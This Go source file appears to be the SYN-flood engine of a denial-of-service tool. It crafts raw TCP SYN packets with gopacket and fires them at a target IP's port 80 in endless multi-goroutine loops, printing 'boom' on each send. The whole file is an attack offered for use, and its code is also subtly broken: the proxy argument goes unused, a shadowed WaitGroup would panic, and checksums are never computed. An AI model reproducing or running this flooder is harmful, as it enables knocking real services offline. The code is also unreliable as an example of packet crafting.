package engines

import (
	"fmt"
	"math/rand"
	"net"

	"runtime"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func syn_handler(ip string) error {
	// Resolve the destination IP address
	dstIP := net.ParseIP(ip)
	if dstIP == nil {
		return fmt.Errorf("invalid IP address: %v", ip)
	}

	// Open a raw socket to send the SYN packet
	c, err := net.ListenPacket("ip4:tcp", "127.0.0.1")
	if err != nil {
		return err
	}
	defer c.Close()

	// Craft a TCP SYN packet
	tcp := &layers.TCP{
		SrcPort: layers.TCPPort(rand.Intn(65535)),
		DstPort: 80,
		Seq:     rand.Uint32(),
	}
	ip4 := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
		SrcIP:    c.LocalAddr().(*net.IPAddr).IP,
		DstIP:    dstIP,
	}
	buffer := gopacket.NewSerializeBuffer()
	err = gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{},
		ip4, tcp, gopacket.Payload([]byte{}))
	if err != nil {
		return err
	}
	packetData := buffer.Bytes()

	// Send the TCP SYN packet to the destination IP address
	if _, err := c.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
		return err
	}

	fmt.Printf("Sent TCP SYN packet to %v\n", dstIP.String())

	return nil
}

func syn_proxy_handler(ip string, proxy string) error {
	// Resolve the destination IP address
	dstIP := net.ParseIP(ip)
	if dstIP == nil {
		return fmt.Errorf("invalid IP address: %v", ip)
	}

	// Open a raw socket to send the SYN packet
	c, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if err != nil {
		return err
	}
	defer c.Close()

	// Craft a TCP SYN packet
	tcp := &layers.TCP{
		SrcPort: layers.TCPPort(rand.Intn(65535)),
		DstPort: 80,
		Seq:     rand.Uint32(),
	}
	ip4 := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
		SrcIP:    c.LocalAddr().(*net.IPAddr).IP,
		DstIP:    dstIP,
	}
	buffer := gopacket.NewSerializeBuffer()
	err = gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{},
		ip4, tcp, gopacket.Payload([]byte{}))
	if err != nil {
		return err
	}
	packetData := buffer.Bytes()

	// Send the TCP SYN packet to the destination IP address
	if _, err := c.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
		return err
	}

	fmt.Printf("Sent TCP SYN packet to %v\n", dstIP.String())

	return nil
}

func Syn(ip string, proxys []string, cpu int) {
	if len(proxys) == 0 {
		runtime.GOMAXPROCS(runtime.NumCPU())
		for {
			var wg sync.WaitGroup
			for i := 0; i < cpu; i++ {
				wg.Add(1)
				go func() {
					//use func handler
					code := syn_handler(ip)
					fmt.Println(code, " boom :", time.Now().Format("15:04:05.000"))
					wg.Done()
				}()
			}
			wg.Wait()
			fmt.Println("All threads are dead, restarting")
		}
	}

	if len(proxys) > 0 {
		runtime.GOMAXPROCS(cpu)
		wg := sync.WaitGroup{}
		for {
			wg.Add(1)
			for _, proxy := range proxys {
				var wg sync.WaitGroup
				go func() {
					//use func handler
					code := syn_proxy_handler(ip, proxy)
					fmt.Println(code, " boom :", time.Now().Format("15:04:05.000"))
					wg.Done()
				}()
				fmt.Println("All threads are dead, restarting")
			}
			wg.Wait()
		}
	}

}
